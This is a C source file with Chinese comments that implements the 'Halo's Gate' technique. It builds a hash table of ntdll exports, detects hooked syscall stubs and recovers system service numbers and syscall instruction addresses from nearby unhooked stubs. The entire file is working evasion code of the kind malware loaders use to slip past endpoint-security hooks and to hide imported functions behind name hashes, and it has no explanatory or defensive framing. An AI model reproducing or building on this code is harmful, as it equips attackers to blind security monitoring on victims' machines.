/* halo_gate.c */
#include "halo_gate.h" 

// ==========================================
// 私有定义
// ==========================================
#define MAX_API_COUNT 3000

typedef struct _API_ENTRY{
    DWORD Hash;
    PVOID Address;
} API_ENTRY, *PAPI_ENTRY;

// 全局变量 (仅限于本文件使用，建议加上 static)
static API_ENTRY ApiTable[MAX_API_COUNT];
static int ApiCount = 0;

// ==========================================
// 辅助函数实现
// ==========================================

// ASCII Hash (公开)
DWORD djb2_hash_a(char* str) {
    unsigned long hash = 5381;
    int c;
    while (c = *str++) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// Unicode Hash (公开，因为 main 也用)
DWORD djb2_hash(WCHAR* str) {
    unsigned long hash = 5381;
    int c;
    while (c = *str++) {
        if (c >= 'A' && c <= 'Z') c += 32;
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// 检查是否被 Hook (私有)
static BOOL IsClean(BYTE* address){
    if(address[0] != 0x4c || address[1] != 0x8b || address[2] != 0xD1 || address[3] != 0xB8){
        return FALSE;
    }
    return TRUE;
}

// 寻找 syscall; ret (私有)
static PVOID Syscaller_finder(BYTE* address){
    for(int i=1; i<=32; i++){
        if(address[i] == 0x0F && address[i+1] == 0x05 && address[i+2] == 0xC3){
            return (PVOID)(address+i);
        }
    }
    return NULL;
}

// ==========================================
// 核心功能实现
// ==========================================

BOOL GetHaloEntry(PVOID FunctionAddress, PHALO_ENTRY pEntry){
    BYTE* pByte = (BYTE*)FunctionAddress;
    
    // 1. 检查自身
    if(IsClean(pByte)){
        pEntry->SSN = ((pByte[5] << 8) | pByte[4]); 
        pEntry->SyscallAddress = Syscaller_finder(pByte);
        if(pEntry->SyscallAddress != NULL) return TRUE;
    }

    // 2. 上下搜索 (Halo's Gate)
    for(int i=1; i<=32; i++){
        // Down
        BYTE* pDown = pByte + (i*32);
        if(IsClean(pDown)){
            pEntry->SSN = (((pDown[5] << 8) | pDown[4]) - i);
            pEntry->SyscallAddress = Syscaller_finder(pDown);
            if(pEntry->SyscallAddress != NULL) return TRUE;
        }
        // Up
        BYTE* pUp = pByte - (i*32);
        if(IsClean(pUp)){
            pEntry->SSN = (((pUp[5] << 8) | pUp[4]) + i);
            pEntry->SyscallAddress = Syscaller_finder(pUp);
            if(pEntry->SyscallAddress != NULL) return TRUE;
        }
    }
    return FALSE;
}

void InitApiTable(PVOID DllBase){
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)DllBase;
    if(pDos->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS pNT = (PIMAGE_NT_HEADERS)((BYTE*)DllBase + pDos->e_lfanew);
    if(pNT->Signature != IMAGE_NT_SIGNATURE) return;

    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)DllBase+ pNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)DllBase + pExport->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)DllBase + pExport->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)DllBase + pExport->AddressOfNameOrdinals);

    printf("[*] Building ApiTable(%d functions)...\n", pExport->NumberOfNames);

    for(DWORD i=0; i<pExport->NumberOfNames; i++){
        char* functionName = (char*)((BYTE*)DllBase + pAddressOfNames[i]);
        DWORD currentHash = djb2_hash_a(functionName);
        WORD ordinal = pAddressOfNameOrdinals[i];
        DWORD rva = pAddressOfFunctions[ordinal];
        PVOID addr = (PVOID)((BYTE*)DllBase + rva);

        if(ApiCount < MAX_API_COUNT){
            ApiTable[ApiCount].Hash = currentHash;
            ApiTable[ApiCount].Address = addr;
            ApiCount++;
        }
    }
    printf("[+] ApiTable Built. Total Entries: %d\n", ApiCount);
}

PVOID GetApi(DWORD TargetHash){
    for(int i=0; i< ApiCount; i++){
        if(ApiTable[i].Hash==TargetHash){
            return ApiTable[i].Address;
        }
    }
    return NULL;
}